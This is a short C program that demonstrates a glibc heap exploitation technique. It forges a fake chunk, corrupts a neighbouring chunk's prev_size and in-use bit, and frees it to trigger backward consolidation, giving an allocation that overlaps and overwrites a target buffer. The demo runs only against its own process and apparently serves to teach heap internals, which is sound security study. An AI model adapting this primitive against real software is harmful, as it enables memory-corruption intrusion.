#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include "malloc_struct.h"

int main(void){
	unsigned long *ma, *mb, *mc;
	malloc_chunk *cc;
	unsigned long *target, *victim;

	ma = malloc(0x28);	// A
	target = malloc(0x18);
	mb = malloc(0x18);	// B
	mc = malloc(0x88);	// C
	cc = mem2chunk(mc);

	for(int i=0; i<7; i++)
		free(calloc(1, 0x88));

	target[0] = 0xdeadbeef;
	printf("target  = %p\n*target = %#lx\n\n"
		, target, *target);

	((malloc_chunk*)ma)->size = 0x61;
	((malloc_chunk*)ma)->fd = ((malloc_chunk*)ma)->bk = (void*)ma;

	assert(&mb[2] == &cc->prev_size);
	mb[2] = 0x60;
	puts("Exploit!");
	cc->size &= ~1; 	// vuln
	free(mc);		// trigger consolidate backward

	victim = malloc(0xe8);	// overwrap target
	memset(victim, 'A', 0xe8);

	printf("victim  = %p (%#zx byte)\n*target = %#lx\n"
	, victim, (mem2chunk(victim)->size)&~7, *target);
}
